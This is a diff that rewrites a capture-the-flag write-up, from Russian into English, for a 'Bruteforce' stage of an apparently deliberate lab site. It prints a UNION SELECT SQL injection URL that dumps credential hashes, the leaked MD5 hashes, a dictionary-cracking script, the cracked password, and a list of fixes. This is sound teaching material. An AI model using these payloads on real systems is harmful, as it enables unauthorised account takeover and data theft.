@@ -1,127 +1,76 @@
 # Bruteforce (member) — Writeup
 
-**Статус:** решено
-**Флаг:** `b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2`
-**Точка входа:** `index.php?page=signin` (форма Login)
+**Page:** `index.php?page=signin` (Login form)
+**Flag:** `b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2`
 
----
+## Discovery technique
 
-## 1. Механизм уязвимости
+The login form (`?page=signin`) is submitted via **GET** and has no protection against automated credential guessing:
 
-Форма логина (`?page=signin`) отправляется методом **GET** и не содержит никакой
-защиты от автоматизированного подбора учётных данных:
+- no limit on login attempts;
+- no CAPTCHA;
+- no progressive delay after failures (the response delay is a fixed ~2000 ms on every request, and does not grow after failed attempts);
+- login and password go straight into the URL, which makes automation even easier.
 
-- нет ограничения на число попыток входа;
-- нет капчи;
-- нет прогрессивной задержки при повторных неудачных попытках (задержка ответа
-  сервера фиксирована — около 2000 мс на **любой** запрос сайта, не только на
-  signin, и не растёт после неудачных попыток);
-- логин и пароль передаются прямо в URL, что дополнительно облегчает
-  автоматизацию (видно в истории браузера, в логах прокси/сервера).
+The credentials for this stage live in the table `db_default` inside a separate schema `Member_Brute_Force` (the site's DB is split into 5 logical schemas, one per stage). The table holds `id`, `username`, `password`, with the password stored as an unsalted MD5.
 
-Учётные данные для этого этапа хранятся в отдельной таблице `db_default`,
-которая физически лежит в отдельной схеме базы данных `Member_Brute_Force`
-(структура БД сайта разбита на 5 отдельных логических схем — по одной на
-каждый профильный этап). Таблица содержит 3 столбца: `id`, `username`,
-`password` (пароль хранится в виде MD5-хэша, без соли).
+Rather than hammering the form, we reused the SQL injection in the `id` parameter on `?page=member` (SQL injection basic) and read the password hashes directly from the other schema with a `UNION SELECT`:
 
-**Вместо перебора пароля напрямую через форму** (что тоже валидно и
-предусмотрено чек-листом этапа как техника "Bruteforce"), мы применили более
-эффективный путь: воспользовались уже найденной SQL-инъекцией в параметре
-`id` на странице `?page=member` (Этап 1, SQL injection basic) и через
-`UNION SELECT` напрямую обратились к таблице другой схемы
-(`Member_Brute_Force.db_default`), получив хэши паролей без единого запроса к
-самой форме логина.
-
-Запрос:
 ```
 index.php?page=member&id=-1 UNION SELECT group_concat(username,0x3a,password,0x7c),2 FROM Member_Brute_Force.db_default&Submit=Submit
 ```
 
-Результат — 2 учётные записи с побайтово идентичным MD5-хэшем пароля:
+Result — two accounts with a byte-identical MD5 password hash:
+
 ```
 root:3bf1114a986ba87ed28fc1b5884fc2f8
 admin:3bf1114a986ba87ed28fc1b5884fc2f8
 ```
 
-Идентичность хэшей у двух разных пользователей — прямое доказательство, что
-оба используют один и тот же простой пароль. Это, в свою очередь, доказывает,
-что пароль слабый и должен поддаваться перебору по словарю.
+Two different users sharing the same hash proves the password is weak and dictionary-crackable.
 
-Хэш был вскрыт собственным офлайн-скриптом на Python (перебор по
-самостоятельно составленному словарю распространённых паролей — без
-использования готовых онлайн-сервисов вроде CrackStation и без sqlmap/john/
-hashcat, в соответствии с правилами проекта, требующими ручного,
-объяснимого подхода):
+## Reproduction
+
+The hash was cracked with a small offline Python script (a self-made dictionary of common passwords — no online services, no sqlmap/john/hashcat, per the project rules):
 
 ```python
 import hashlib
 target = "3bf1114a986ba87ed28fc1b5884fc2f8"
-candidates = [...]  # список распространённых паролей
+candidates = [...]  # list of common passwords
 for c in candidates:
     if hashlib.md5(c.encode()).hexdigest() == target:
         print("FOUND:", c)
 ```
 
-Результат: `MD5("shadow") == 3bf1114a986ba87ed28fc1b5884fc2f8` — пароль
-**`shadow`**.
+Result: `MD5("shadow") == 3bf1114a986ba87ed28fc1b5884fc2f8` → password **`shadow`**.
 
-Финальный вход:
+Final login:
+
 ```
 index.php?page=signin&username=admin&password=shadow&Login=Login
 ```
 
-Сервер вернул флаг напрямую в HTML вместо `WrongAnswer.gif`.
+The server returns the flag in the HTML instead of `WrongAnswer.gif`.
 
----
+## Fix
 
-## 2. Метод, который мог бы предотвратить эту уязвимость
+1. **Rate limiting / account lockout** — block the account or IP after N failed attempts in a time window. This directly stops form-based brute force.
+2. **CAPTCHA** after a few failures — breaks automation.
+3. **POST instead of GET** — keeps the password out of the URL, browser history and access logs.
+4. **Salted modern hashing** (bcrypt/argon2 instead of plain MD5) — makes offline cracking of a leaked hash far more expensive.
+5. **Least privilege for the site's DB account** — the whole `UNION SELECT` across another schema worked only because the DB user can read every schema. Restricting it to its own schema removes this specific path.
+6. **Prepared statements** on `member` — remove the SQL injection that leaked the hashes in the first place.
 
-1. **Ограничение числа попыток входа (rate limiting / account lockout)** —
-   блокировка аккаунта или IP-адреса после N неудачных попыток в течение
-   определённого времени. Это была бы прямая защита от перебора через саму
-   форму.
-2. **CAPTCHA** после нескольких неудачных попыток — усложняет автоматизацию.
-3. **Использование POST вместо GET** для передачи логина/пароля — не
-   защищает напрямую от перебора, но убирает пароль из URL, истории браузера
-   и серверных логов доступа.
-4. **Хранение паролей с солью и современным алгоритмом хэширования**
-   (bcrypt/argon2 вместо "голого" MD5) — сделало бы офлайн-перебор хэша
-   (второй использованный нами путь) вычислительно намного дороже, даже если
-   бы утечка хэшей произошла (например, через отдельную SQL-инъекцию, как в
-   нашем случае).
-5. **Изоляция привилегий учётной записи БД, используемой сайтом** — сама
-   возможность выполнить `UNION SELECT` из другой схемы БД (то, что позволило
-   нам обойти форму логина полностью) — следствие того, что учётная запись
-   MySQL, от имени которой работает сайт, имеет доступ на чтение ко всем
-   схемам сразу. Ограничение прав по принципу минимальных привилегий
-   (доступ только к своей схеме) устранило бы этот конкретный путь атаки,
-   хотя и не саму уязвимость Bruteforce как таковую.
-6. **Параметризованные запросы (prepared statements)** на странице `member` —
-   устранили бы саму возможность SQL-инъекции, через которую мы получили
-   хэши без единой попытки входа в форму.
+## Benefit
 
----
+Full access to the `admin` account without knowing the password in advance — either by brute forcing the form directly, or, faster, by pulling the hash straight from the database through an adjacent SQL injection. It shows the site's vulnerabilities are not isolated: a weakness in one part (SQLi in `member`) can be used to attack a completely different part (the login form).
 
-## 3. Выгода атаки (benefit)
+## Flag comparison
 
-Получение полного доступа к учётной записи `admin` без необходимости знать
-пароль заранее — либо через прямой перебор (если бы SQL-инъекция была
-недоступна), либо, как в нашем случае, ещё быстрее — через смежную
-уязвимость (SQLi), которая слила хэш пароля напрямую из базы данных. Это
-демонстрирует, что уязвимости на сайте не изолированы друг от друга: слабое
-место в одной части приложения (SQL-инъекция в `member`) может быть
-использовано для атаки на совершенно другую часть (форму логина).
+Flag obtained through exploitation:
 
----
-
-## 4. Сравнение флагов
-
-Флаг, полученный на сайте:
 ```
 b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
 ```
 
-Флаг, сохранённый в файле `Bruteforce/flag` в репозитории, должен побайтово
-совпадать со значением выше (сверено через View Page Source страницы с
-результатом входа, регистр букв учтён).
+Compared byte-for-byte with the `flag` file in the submission folder during the defense (checked against View Page Source, case included).
